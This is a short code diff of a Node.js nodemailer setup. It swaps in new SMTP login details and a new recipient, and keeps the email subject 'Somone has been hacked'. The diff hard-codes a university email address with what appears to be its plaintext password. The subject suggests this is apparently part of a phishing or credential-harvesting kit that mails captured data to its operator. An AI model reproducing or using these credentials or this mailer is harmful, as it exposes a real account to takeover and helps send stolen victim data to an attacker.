@@ -20,13 +20,13 @@ var transporter = nodemailer.createTransport({
     port: 465,
 
     auth: {
-        user: 'fadysadakah.emh@gmail.com',
-        pass: 'encrypted'
+        user: 'sali7639@su.edu.eg',
+        pass: '201817639'
     }
 });
 var mailOptions = {
-    from: 'Fady Sadakah<fadysadakah.emh@gmail.com>',
-    to: "fadysadakah.emh@gmail.com",
+    from: 'sali7639@su.edu.eg',
+    to: "shady.gabr.sadakah@gmail.com",
     subject: 'Somone has been hacked',
     text: '',
     html: ''
